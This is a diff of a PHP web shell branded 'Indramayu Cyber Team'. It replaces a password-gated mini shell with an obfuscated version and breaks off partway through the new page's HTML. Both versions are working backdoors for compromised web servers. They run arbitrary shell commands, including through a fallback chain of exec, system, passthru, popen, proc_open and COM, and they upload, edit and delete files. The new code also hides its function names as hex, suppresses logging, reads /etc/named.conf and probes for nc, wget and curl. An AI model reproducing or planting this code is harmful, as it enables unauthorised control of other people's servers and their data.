@@ -1,475 +1,802 @@
-<?php 
-@error_reporting(0);
-@set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('output_buffering',0);
-@ini_set('display_errors', 0);
-$auth_pass = "c4ca4238a0b923820dcc509a6f75849b";
-?>
-	
 <?php
-function lp(){
-?>
-<html>
-	<head>
-		<title>Indramayu Cyber 
- Mini Shell</title>
-		<link href="https://fonts.googleapis.com/css?family=Iceland:400,700" rel="stylesheet" type="text/css">
-	</head>
-	<body bgcolor="black" style="color:white">
-		<center>
-			<br>
-				<H1><center><font face="Iceland" size=20>Indramayu<font color=red>Cyber</font>Team</font></center></H1>
-				<br>
-			<div>
-				<form action method="get">
-					<input type="hidden" name="action" value="login" />
-					<input type="password" name="pass" style="border-radius:10px" placeholder="         password">
-					<input type="submit" value="LogIn" style="font-family:Iceland;margin-top:1px;width:70px;background:black;color:red;border:2px solid #1abc9c ;border-radius:10px">
-				</form><br/>
-			</div>
-			<?php echo system($_GET["cmd"]); ?>
-		</center>
-<?php
-;}
-if(isset($_GET['action'])){
-	if($_GET['action']=='login'){
-		setcookie('password',$_GET['pass']);
-		echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
-	}
-	else if($_GET['action']=='logout'){
-		setcookie('password','',-86400*30*12);
-		echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
-	}
+
+$shellName = 'Indramayu Cyber Team';
+$logo = 'https://1.bp.blogspot.com/-M0ZH5WcjeLk/YPHKrrDwwqI/AAAAAAAAALQ/UElzDOSvAwErnaFmd0hSxqxN6gCiC4-cwCLcBGAsYHQ/s320/images.jpeg';
+$func = ["7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "7363616e646972", "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e", "6469726e616d65", "6469736b5f746f74616c5f7370616365", "6469736b5f667265655f7370616365", "696e695f676574", "707265675f6d617463685f616c6c", "706f7369785f6765747077756964", "706f7369785f6765746772676964", "70617468696e666f", "66696c656f776e6572", "66696c6567726f7570", "66696c6574797065", "676574486f73744e616d65", "676574486f737442794e616d65", "737562737472", "737472737472", "696e695f736574", "66696c65", "7374725f7265706c616365", "6578706c6f6465", "6576616c", "6f625f7374617274", "66756e6374696f6e5f657869737473", "6572726f725f7265706f7274696e67", "7365745f74696d655f6c696d6974", "636c656172737461746361636865", "646174655f64656661756c745f74696d657a6f6e655f736574", "666c757368", "7374726c656e", "7472696d", "656d707479", "6973736574", "66696c657065726d73", "7374726c656e", "636f756e74", "726f756e64", "6d696d655f636f6e74656e745f74797065", "6765745f63757272656e745f75736572", "6765746d79756964", "6765746d79676964", "706f7369785f67657465756964", "706f7369785f67657465676964"];
+
+for ($i = 0; $i < count($func); $i++) {
+	$func[$i] = dehex($func[$i]);
 }
-if(isset($_COOKIE['password'])){
-	if(md5($_COOKIE['password'])==$auth_pass || $_COOKIE['L']=="L"){
-		?>
-<?php
 
+session_start();
+$func[50](0);
+@$func[51](0);
+@$func[52]();
+@$func[43]('error_log', null);
+@$func[43]('log_errors',0);
+@$func[43]('max_execution_time',0);
+@$func[43]('output_buffering',0);
+@$func[43]('display_errors', 0);
+$func[53]("Asia/Jakarta");
 
-
-if(get_magic_quotes_gpc()){
-    foreach($_POST as $key=>$value){
-        $_POST[$key] = stripslashes($value);
-    }
-}
-function perms($file){
-    $perms = @fileperms($file);
-
-if (($perms & 0xC000) == 0xC000) {
-    // Socket
-    $info = 's';
-} elseif (($perms & 0xA000) == 0xA000) {
-    // Symbolic Link
-    $info = 'l';
-} elseif (($perms & 0x8000) == 0x8000) {
-    // Regular
-    $info = '-';
-} elseif (($perms & 0x6000) == 0x6000) {
-    // Block special
-    $info = 'b';
-} elseif (($perms & 0x4000) == 0x4000) {
-    // Directory
-    $info = 'd';
-} elseif (($perms & 0x2000) == 0x2000) {
-    // Character special
-    $info = 'c';
-} elseif (($perms & 0x1000) == 0x1000) {
-    // FIFO pipe
-    $info = 'p';
+if (isset($_GET['dir'])) {
+	$dir = $_GET['dir'];
+	$func[3]($dir);
 } else {
-    // Unknown
-    $info = 'u';
+	$dir = $func[2]();
 }
-
-// Owner
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-            (($perms & 0x0800) ? 's' : 'x' ) :
-            (($perms & 0x0800) ? 'S' : '-'));
-
-// Group
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-            (($perms & 0x0400) ? 's' : 'x' ) :
-            (($perms & 0x0400) ? 'S' : '-'));
-
-// World
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-            (($perms & 0x0200) ? 't' : 'x' ) :
-            (($perms & 0x0200) ? 'T' : '-'));
-
-    return $info;
-}
-echo '
-<!DOCTYPE HTML>
-<HTML>
-<HEAD>
-	<link href="https://fonts.googleapis.com/css?family=Iceland:400,700" rel="stylesheet" type="text/css">
-<title>Mini Shell</title>
-<style>
-body{
-font-family: "Iceland", cursive;
-background-color: black;
-color:white;
-}
-#content tr:hover{
-background-color: #006c96;
-text-shadow:0px 0px 10px #fff;
-}
-#content .first{
-background-color: #006c96;
-}
-table{
-border: 1px #f70c0c dotted;
-}
-a{
-color:white;
-text-decoration: none;
-}
-a:hover{
-color:red;
-text-shadow:0px 0px 10px #ffffff;
-}
-input,select,textarea{
-border: 2px #006c96 solid;
--moz-border-radius: 5px;
--webkit-border-radius:5px;
-border-radius:5px;
-}
-</style>
-</HEAD>
-<BODY>
-	';
-?>
-<H1><center><font size=20>Indra<font color=red>mayu</font>Cyber<font color=red>T</font>eam</font></center></H1>
-<?php
-echo '
-<table width="700" border="1" cellpadding="3" cellspacing="1" align="center">
-<tr><td>Current Path : ';
-if(isset($_GET['path'])){
-    $path = $_GET['path'];
-}else{
-    $path = getcwd();
-}
-$pathen = $path;
-$path = str_replace('\\','/',$path);
-$paths = explode('/',$path);
-
-foreach($paths as $id=>$pat){
-    if($pat == '' && $id == 0){
-        $a = true;
-        echo '<a href="?path="/"">/</a>';
-        continue;
-    }
-    if($pat == '') continue;
-    echo '<a href="?path=';
-    $linkpath = '';
-    for($i=0;$i<=$id;$i++){
-        $linkpath .= "$paths[$i]";
-        if($i != $id) $linkpath .= "/";
-    }
-    echo $linkpath;
-    echo '">'.$pat.'</a>/';
-}
-echo '<font color=red>    [</font>';
-if(is_writable("$path/$dir")) echo '<font color="green">';
-elseif(!is_readable("$path/$dir")) echo '<font color="red">';
-echo perms("$path/$dir");
-echo '<font color=red>]</font>';
-echo '</td></tr><tr><td>';
-if(isset($_FILES['file'])){
-    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-        echo '<font color="green">Upload Success</font><br />';
-    }else{
-        echo '<font color="red">Upload Failed</font><br />';
-    }
-}
-echo '<form enctype="multipart/form-data" method="POST">
-File Manager : <font color="cyan"><input type="file" name="file" /></font>
-<input type="submit" value="Upload" />-------<font color="cyan">[</font><a href="?path='.$path.'&aksi=buat_file"><font color="green">Create File</font></a><font color="cyan">]</font>----<font color="cyan">[</font><a href="?path='.$path.'&aksi=buat_folder"><font color="green">Create Dir</font></a><font color="cyan">]</font>----<font color="cyan">[</font><a href="?"><font color="green">Home</font></a><font color="cyan">]</font>-------
-</form></table>';
-echo '<table width="600" border="1" cellpadding="3" cellspacing="1" align="center"></tr></td>';
-echo '<tr><td>
-  ---------------------------------------------<font color=red>[</font><a href="?x=changepass">Ubah Pass</a><font color=red>]</font>-----------<font color=red>[</font><a href="?action=logout">LogOut</a><font color=red>]</font>---------------------------------------------
-</td></tr></table>';
-
-//buat_file
-		if ($_GET['aksi'] == 'buat_file') {
-			echo "<center><h4>Buat File :</h4>
-			<form method='POST'>
-					<input type='text' name='nama_file[]' placeholder='Nama File...'>
-				 <br><br>
-				<div id='output'></div>
-				<textarea name='isi_file' class='form-control' cols='50' rows='10' placeholder='Isi File...'></textarea><br/>
-				<input type='submit'  name='bikin' value='Buat'>
-			</form>";
-		
-			if (isset($_POST['bikin'])) {
-				$name = $_POST['nama_file'];
-				$isi_file = $_POST['isi_file'];
-				foreach ($name as $nama_file) {
-					$handle = @fopen("$nama_file", "w");
-					if($isi_file){
-						$buat = @fwrite($handle, $isi_file);
-					}else{
-						$buat = $handle;
-					}
-				}
-				if ($buat) {
-					
-					echo "<script>alert('Berhasil Membuat File')</script>";
-					
-				}else{
-					
-					echo "<script>alert('Gagal Membuat File')</script>";
-					
-				}
-			}
-		}
-		
-		/*
-			Add Folder
-		*/
-		if ($_GET['aksi'] == 'buat_folder' ) {
-			echo "<center>
-			<h4>Buat Folder :</h4>
-			<form method='POST'>
-					<input type='text' name='nama_folder[]' placeholder='Nama Folder...'>
-                  <br><br>
-				<input type='submit' name='buat' value='Buat'>
-			</form></center>";
-		
-			if (isset($_POST['buat'])) {
-				$nama = $_POST['nama_folder'];
-				foreach ($nama as $nama_folder) {
-					$folder = $nama_folder;
-					
-					$fd = @mkdir ($folder);
-					
-				}
-				if ($fd) {
-					echo "<script>alert('Berhasil Membuat Dir Baru')</script>";
-				}else{
-					echo "<script>alert('Gagal Membuat Dir Baru')</script>";
-				}
-			}
-		}
-		
-
-if(isset($_GET['filesrc'])){
 	
-    echo "<br><center>File ---> ";	
-    echo $_GET['filesrc'];
-    echo "</center><br>";
-
-
-    echo('<center><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><center>');
-}elseif(isset($_GET['option']) && $_POST['opt'] != 'delet'){
-    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
-    if($_POST['opt'] == 'chmod'){
-        if(isset($_POST['perm'])){
-            if(chmod($_POST['path'],$_POST['perm'])){
-                echo '<font color="green">Success Change Permission</font><br />';
-            }else{
-                echo '<font color="red">Failed Change Permission</font><br />';
-            }
-        }
-        echo '<form method="POST">
-        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-        <input type="hidden" name="path" value="'.$_POST['path'].'">
-        <input type="hidden" name="opt" value="chmod">
-        <input type="submit" value="Go" />
-        </form>';
-    }elseif($_POST['opt'] == 'rename'){
-        if(isset($_POST['newname'])){
-            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-                echo '<font color="green">Success</font><br />';
-            }else{
-                echo '<font color="red">Failed</font><br />';
-            }
-            $_POST['name'] = $_POST['newname'];
-        }
-        echo '<form method="POST">
-        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
-        <input type="hidden" name="path" value="'.$_POST['path'].'">
-        <input type="hidden" name="opt" value="rename">
-        <input type="submit" value="Go" />
-        </form>';
-    }elseif($_POST['opt'] == 'edit'){
-        if(isset($_POST['src'])){
-            $fp = fopen($_POST['path'],'w');
-            if(fwrite($fp,$_POST['src'])){
-                echo '<font color="green">Success</font><br />';
-            }else{
-                echo '<font color="red">Failed</font><br />';
-            }
-            fclose($fp);
-        }
-        echo '<form method="POST">
-        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
-        <input type="hidden" name="path" value="'.$_POST['path'].'">
-        <input type="hidden" name="opt" value="edit">
-        <input type="submit" value="Go" />
-        </form>';
-    }
-    echo '</center>';
-}else{
-    echo '<br /><center>';
-    if(isset($_GET['option']) && $_POST['opt'] == 'delet'){
-        if($_POST['type'] == 'dir'){
-            if(rmdir($_POST['path'])){
-                echo '<font color="green">Success</font><br />';
-            }else{
-                echo '<font color="red">Failed</font><br />';
-            }
-        }elseif($_POST['type'] == 'file'){
-            if(unlink($_POST['path'])){
-                echo '<font color="green">Success</font><br />';
-            }else{
-                echo '<font color="red">Failed</font><br />';
-            }
-        }
-    }
-    echo '</center>';
-	if(!isset($_GET['x'])){
-	?>
-	<?php
-	$scandir = scandir($path);
-    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-    <tr class="first">
-        <td><center><font color="red">Dir</font></center></td>
-        <td><center><font color="red">Size</font></center></td>
-        <td><center><font color="red">Permissions</font></center></td>
-        <td><center><font color="red">Setting</font></center></td>
-    </tr>';
-
-    foreach($scandir as $dir){
-        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
-        $dirlink = "$path/$dir";
-        echo "<tr>
-        <td><a href=\"?path=$dirlink\">$dir</a></td>
-        <td><center>--</center></td>
-        <td><center>";
-        if(is_writable("$path/$dir")) echo '<font color="green">';
-        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
-        echo perms("$path/$dir");
-        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
-        
-        echo "</center></td>
-        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
-        <select name=\"opt\">
-	    <option value=\"\">Select</option>
-        <option value=\"delet\">Delete</option>
-        <option value=\"chmod\">Chmod</option>
-        <option value=\"rename\">Rename</option>
-        </select>
-        <input type=\"hidden\" name=\"type\" value=\"dir\">
-        <input type=\"hidden\" name=\"name\" value=\"$dir\">
-        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
-        <input type=\"submit\" value=\">\" />
-        </form></center></td>
-        </tr>";
-    }
-    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
-    foreach($scandir as $file){
-        if(!is_file("$path/$file")) continue;
-        $size = filesize("$path/$file")/1024;
-        $size = round($size,3);
-        if($size >= 1024){
-            $size = round($size/1024,2).' MB';
-        }else{
-            $size = $size.' KB';
-        }
-        $filelink = "$path/$file";
-        echo "<tr>
-        <td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
-        <td><center>".$size."</center></td>
-        <td><center>";
-        if(is_writable("$path/$file")) echo '<font color="green">';
-        elseif(!is_readable("$path/$file")) echo '<font color="red">';
-        echo perms("$path/$file");
-        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
-        echo "</center></td>
-        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
-        <select name=\"opt\">
-	    <option value=\"\">Select</option>
-        <option value=\"delet\">Delete</option>
-        <option value=\"chmod\">Chmod</option>
-        <option value=\"rename\">Rename</option>
-        <option value=\"edit\">Edite File</option>
-        </select>
-        <input type=\"hidden\" name=\"type\" value=\"file\">
-        <input type=\"hidden\" name=\"name\" value=\"$file\">
-        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
-        <input type=\"submit\" value=\">\" />
-        </form></center></td>
-        </tr>";
-    }
-    echo '</table>
-    </div>';
-}
-	?>
-	<?php 
-	}
-if(isset($_GET['x']) && $_GET['x']=='changepass'){
-		?>
-		<?php
-		function fgc($file){
-			return file_get_contents($file);
-		}
-		function changepass($plain){
-			$newpass = md5($plain);
-			$newpass = "\$auth_pass = \"".$newpass."\";";
-			$con = fgc($_SERVER['SCRIPT_FILENAME']);
-			$con = preg_replace("/\\\$auth_pass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is",$newpass,$con);
-			return file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
-		}
-		echo '<center><h1>Change Shell Password</h1></center>';	
-		echo  '<center>';
-		echo '<form action="" method=post ><table>';
-		echo '<tr><td>New Password</td><td> :  <input type=password name=pass1 style="border-radius:5px;" /></td></tr>';
-		echo '<tr><td>Confirm Password</td><td> :  <input type=password name=pass2 style="border-radius:5px;" /></td></tr>';
-		echo '<tr><td colspan=2><input type=submit value=submit name=L style="border-radius:5px;width:100%"/></td></tr></table>';
-		echo '</form>';
-	if(isset($_POST['L'])){
-		if($_POST['pass1'] == $_POST['pass2']){
-			if(changepass($_POST['pass1'])){
-				echo '<script>alert("password change successfully")</script>';			
-			}else{
-				echo '<script>alert("password change failed")</script>';			
+$d0mains = @$func[44]("/etc/named.conf", false);
+if (!$d0mains) {
+	$dom = "<font class='text-danger'>Can't Read /etc/named.conf</font>";
+} else { 
+	$count = 0;
+	foreach ($d0mains as $d0main) {
+		if (@$func[43]($d0main, "zone")) {
+			$func[32]('#zone "(.*)"#', $d0main, $domains);
+			$func[54]();
+			if ($func[55]($func[56]($domains[1][0])) > 2){
+				$func[54]();
+				$count++;
 			}
-		}else{
-			echo '<script>alert("password not match")</script>';
 		}
 	}
-	?>
-	<?php 
+	$dom = "<font class='text-success'>$count Domain</font>";
 }
-echo '
-</BODY>
-</HTML>';
-?>
-	
-<!-- //////////////////////////////////////////////////// -->
-		<?php
+
+$dir = $func[45]("\\", "/", $dir);
+$scdir = $func[46]("/", $dir);
+$total = $func[29]($dir);
+$free = $func[30]($dir);
+$pers =  (int) ($free / $total * 100);
+$ds = @$func[31]("disable_functions");
+$show_ds = (!empty($ds)) ? "<font class='text-danger'>$ds</font>" : "<font class='text-success'>All function is accessible</font>";
+
+$cmd_uname = exe("uname -a");
+$uname = $func[49]('php_uname') ? $func[41](@$func[0](), 0, 120) : ($func[55]($cmd_uname) > 0 ? $cmd_uname : '( php_uname ) Function Disabled !');
+
+if (strtolower($func[41](PHP_OS, 0, 3)) == "win") {
+	$sys = "win";
+} else {
+	$sys = "unix";
+}
+
+if (isset($_GET['do'])) {
+	$do = $_GET['do'];
+	if ($do == 'delete') {
+		if ($func[12]($dir)) {
+			if (deleter($dir)) {
+				flash("File/Folder deleted successfully!", "Success", "success", "?dir=" . dirname($dir));
+			} else {
+				flash("File/Folder failed to delete!", "Failed", "danger");
+			}
+		} else {
+			flash("File/Folder is doesn't exist!", "Failed", "warning");
+		}
+	} else if ($do == 'download') {
+		if ($func[12]($dir)) {
+			header("Content-Type: application/octet-stream");
+			header("Content-Transfer-Encoding: Binary");
+			header("Content-Length: " . $func[10]($dir));
+			header("Content-disposition: attachment; filename=\"".basename($dir)."\"");
+		} else {
+			flash("File is doesn't exist!", "Failed", "warning");
+		}
+	}
+} else {
+	$do = 'filesman';
+	$title = 'Files Manager';
+	$icon = 'archive';
+}
+
+((isset($_POST["foldername"])) ? ($func[12]("$dir/{$_POST['foldername']}") ? flash("Folder name is exist!", "Failed", "warning") : ($func[15]("$dir/{$_POST['foldername']}") ? flash("Folder created successfully!", "Success", "success") : flash("Folder failed to create!", "Failed", "danger"))) : null);
+
+((isset($_POST["filename"]) && isset($_POST['filecontent'])) ? ($func[12]("$dir/{$_POST['filename']}") ? flash("File name is exist!", "Failed", "warning") : ($func[13]("$dir/{$_POST['filename']}", $_POST['filecontent']) ? flash("File created successfully!", "Success", "success") : flash("File failed to create!", "Failed", "danger"))) : null);
+
+((isset($_POST["newname"]) && isset($_POST['oldname'])) ? ($func[12]("$dir/{$_POST['newname']}") ? flash("File/Folder name is exist!", "Failed", "warning") : ($func[16]("$dir/{$_POST['oldname']}", $_POST['newname']) ? flash("File/Folder renamed successfully!", "Success", "success") : flash("File/Folder failed to rename!", "Failed", "danger"))) : null);
+
+((isset($_POST["filename"]) && isset($_POST['content'])) ? ($func[13]("$dir/{$_POST['filename']}", $_POST['content']) ? flash("File saved successfully!", "Success", "success") : flash("File failed to save!", "Failed", "danger")) : null);
+
+if (isset($_FILES["uploadfile"])) {
+	$n = $_FILES["uploadfile"]["name"];
+	for ($i = 0; $i < count($n); $i++) {
+		if ($func[11]($_FILES["uploadfile"]["tmp_name"][$i], $n[$i])) {
+			flash("File uploaded successfully!", "Success", "success");
+		} else {
+			flash("File failed to upload!", "Failed", "danger");
+		}
+	}
+}
+
+if (@$func[31]('open_basedir')) {
+	$basedir_data = @$func[31]('open_basedir');
+	if ($func[55]($basedir_data) > 120){
+		$open_b = "<font class='text-success'>" . $func[41]($basedir_data, 0, 120) . "...</font>";
+	} else {
+		$open_b = '<font class="text-success">' . $basedir_data . '</font>';
+	}
+} else {
+	$open_b = '<font class="text-warning">NONE</font>';
+}
+
+if (!$func[49]('posix_getegid')) {
+	$user = $func[49]("get_current_user") ? @$func[64]() : "????";
+	$uid = $func[49]("getmyuid") ? @$func[65]() : "????";
+	$gid = $func[49]("getmygid") ? @$func[66]() : "????";
+	$group = "?";
+} else {
+	$uid = $func[49]("posix_getpwuid") && $func[49]("posix_geteuid") ? @$func[33]($func[67]()) : ["name" => "????", "uid" => "????"];
+	$gid = $func[49]("posix_getgrgid") && $func[49]("posix_getegid") ? @$func[34]($func[68]()) : ["name" => "????", "gid" => "????"];
+	$user = $uid['name'];
+	$uid = $uid['uid'];
+	$group = $gid['name'];
+	$gid = $gid['gid'];
+}
+
+if ($sys == 'unix') {
+	if (!@$func[31]('safe_mode')) {
+		if ($func[55](exe("id")) > 0) {
+			$userful = ['gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl'];
+			$x = 0;
+			foreach ($userful as $i) {
+				if (which($i)) {
+					$x++;
+					$useful .= $i . ', ';
+				}
+			}
+			if ($x == 0) {
+				$useful = '--------';
+			}
+			$downloaders = ['wget','fetch','lynx','links','curl','get','lwp-mirror'];
+			$x = 0;
+			foreach($downloaders as $i) {
+				if (which($i)) {
+					$x++;
+					$downloader .= $i . ', ';
+				}
+			}
+			if ($x == 0) {
+				$downloader = '--------';
+			}
+		}
+	}
+}
+
+function hex($str) {
+	global $func;
+	$r = "";
+	for ($i = 0; $i < $func[55]($str); $i++) {
+		$r .= dechex(ord($str[$i]));
+	}
+	return $r;
+}
+
+function dehex($str) {
+	$r = "";
+	$len = (strlen($str) - 1);
+	for ($i = 0; $i < $len; $i += 2) {
+		$r .= chr(hexdec($str[$i].$str[$i + 1]));
+	}
+	return $r;
+}
+
+function formatSize($bytes) {
+	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
+	for ( $i = 0; $bytes >= 1024 && $i < ( count( $types ) - 1 ); $bytes /= 1024, $i++ );
+	return( round( $bytes, 2 )." ".$types[$i] );
+}
+
+function perms($file) {
+	global $func;
+	$perms = fileperms($file);
+	if (($perms & 0xC000) == 0xC000){
+		$info = 's';
+	}elseif (($perms & 0xA000) == 0xA000){
+		$info = 'l';
+	}elseif (($perms & 0x8000) == 0x8000){
+		$info = '-';
+	}elseif (($perms & 0x6000) == 0x6000){
+		$info = 'b';
+	}elseif (($perms & 0x4000) == 0x4000){
+		$info = 'd';
+	}elseif (($perms & 0x2000) == 0x2000){
+		$info = 'c';
+	}elseif (($perms & 0x1000) == 0x1000){
+	$info = 'p';
 	}else{
-		lp();
+		$info = 'u';
 	}
-}else{
-	echo lp();
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+	(($perms & 0x0800) ? 's' : 'x' ) :
+	(($perms & 0x0800) ? 'S' : '-'));
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+	(($perms & 0x0400) ? 's' : 'x' ) :
+	(($perms & 0x0400) ? 'S' : '-'));
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+	(($perms & 0x0200) ? 't' : 'x' ) :
+	(($perms & 0x0200) ? 'T' : '-'));
+	return $func[41](sprintf('%o', $perms), -4) . ' >> ' .$info;
 }
+
+function exe($in) {
+	global $func;
+	$out = '';
+	try {
+		if ($func[49]('exec')) {
+			@$func[23]($in, $out);
+			$out = @join("\n", $out);
+		} elseif ($func[49]('passthru')) {
+			$func[48]();
+			@passthru($in);
+			$out = $func[27]();
+		} elseif($func[49]('system')) {
+			$func[48]();
+			@system($in);
+			$out = $func[27]();
+		} elseif ($func[49]('shell_exec')) {
+			$out = $func[25]($in);
+		} elseif ($func[49]("popen") && $func[49]("pclose")) {
+			if (is_resource($f = @popen($in,"r"))) {
+				$out = "";
+				while(!@feof($f))
+				$out .= fread($f, 1024);
+				pclose($f);
+			}
+		} elseif ($func[49]('proc_open')) {
+			$pipes = [];
+			$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
+			$out = @stream_get_contents($pipes[1]);
+		} elseif (class_exists('COM')) {
+			$ws = new COM('WScript.shell');
+			$exec = $ws->exec('cmd.exe /c '.$in);
+			$stdout = $exec->StdOut();
+			$out = $stdout->ReadAll();
+		}
+	} catch(Exception $e) {}
+	return $out;
+}
+
+function checkName($name) {
+	global $func;
+	if ($func[55]($name) > 18) {
+		return $func[41]($name, 0, 18) . "...";
+	}
+	return $name;
+}
+
+function checkPerm($dir, $perm) {
+	global $func;
+	$perm = explode('>>', $perm);
+	if ($func[8]($dir)) {
+		return "<font class='text-success'>".$perm[0]."</font> >> <font class='text-success'>".$perm[1]."</font>";
+	} elseif (!$func[9]($dir)) {
+		return "<font class='text-danger'>".$perm[0]."</font> >> <font class='text-danger'>".$perm[1]."</font>";
+	} else {
+		return "<font class='text-secondary'>".$perm[0]."</font> >> <font class='text-secondary'>".$perm[1]."</font>";
+	}
+}
+
+function getowner($item) {
+	global $func;
+	if ($func[49]("posix_getpwuid")) {
+		$downer = @$func[33](fileowner($item));
+		$downer = $downer['name'];
+	} else {
+		$downer = fileowner($item);
+	}
+	if ($func[49]("posix_getgrgid")) {
+		$dgrp = @$func[34](filegroup($item));
+		$dgrp = $dgrp['name'];
+	} else {
+		$dgrp = filegroup($item);
+	}
+	return $downer . '/' . $dgrp;
+}
+
+function geticon($file) {
+	global $func;
+	$ext = strtolower($func[35]($file, PATHINFO_EXTENSION));
+	if ($ext == 'php' || $ext == 'html' || $ext == 'js' || $ext == 'css' || $ext == 'py' || $ext == 'perl' || $ext == 'sh') {
+		return 'file-code';
+	} else if ($ext == 'pdf') {
+		return 'file-pdf';
+	} else if ($ext == 'txt') {
+		return 'file-alt';
+	} else if ($ext == 'csv') {
+		return 'file-csv';
+	} else if ($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'gif') {
+		return 'file-image';
+	} else if ($ext == 'mp4' || $ext == '3gp' || $ext == 'mkv') {
+		return 'file-video';
+	} else if ($ext == 'docx' || $ext == 'doc' || $ext == 'docm') {
+		return 'file-word';
+	} else if ($ext == 'ppt' || $ext == 'pptx') {
+		return 'file-powerpoint';
+	} else if ($ext == 'xlsx' || $ext == 'xlsb' || $ext == 'xlsm' || $ext == 'xltx' || $ext == 'xltm') {
+		return 'file-excel';
+	} else if ($ext == 'mp3' || $ext == 'wav') {
+		return 'file-audio';
+	} else if ($ext == 'sql' || $ext == 'db') {
+		return 'database';
+	} else if ($ext == 'zip' || $ext == 'tar' || $ext == 'gz' || $ext == 'tar.gz' || $ext == '7z' || $ext == 'bz2') {
+		return 'file-archive';
+	} else {
+		return 'file';
+	}
+}
+
+function which($p) {
+	global $func;
+	$path = exe('which ' . $p);
+	if (!empty($path)) {
+		return $func[55]($path);
+	}
+	return false;
+}
+
+function flash($message, $status, $class, $redirect = false) {
+	if (!empty($_SESSION["message"])) {
+		unset($_SESSION["message"]);
+	}
+	if (!empty($_SESSION["class"])) {
+		unset($_SESSION["class"]);
+	}
+	if (!empty($_SESSION["status"])) {
+		unset($_SESSION["status"]);
+	}
+	$_SESSION["message"] = $message;
+	$_SESSION["class"] = $class;
+	$_SESSION["status"] = $status;
+	if ($redirect) {
+		header('Location: ' . $redirect);
+		exit();
+	}
+	return true;
+}
+
+function clear() {
+	if (!empty($_SESSION["message"])) {
+		unset($_SESSION["message"]);
+	}
+	if (!empty($_SESSION["class"])) {
+		unset($_SESSION["class"]);
+	}
+	if (!empty($_SESSION["status"])) {
+		unset($_SESSION["status"]);
+	}
+	return true;
+}
+
+function deleter($d) {
+	global $func;
+	if (trim($func[35]($d, PATHINFO_BASENAME), '.') === '') {
+		return false;
+	};
+	if ($func[6]($d)) {
+		array_map("deleter", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
+		rmdir($d);
+		return true;
+	} else {
+		unlink($d);
+		return true;
+	}
+	return false;
+}
+
+$scandir = $func[21]($dir);
+
 ?>
-<center><br><font face="Iceland">copyright<font color=red>©</font>Indramayu<font color=red>Cyber</font>Team<font color=red>'</font>s</font><center>
-</body>
-</html>
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+	<title><?= $shellName ?></title>
+</head>
+<body>
+	<div class="container-lg">
+		
+		<nav class="navbar navbar-light bg-light">
+			<div class="container-fluid">
+				<a class="navbar-brand" href="?">
+					<img src="<?= $logo ?>" alt="logo" width="30" height="24" class="d-inline-block align-text-top">
+					<?= $shellName ?>
+				</a>
+			</div>
+		</nav>
+		
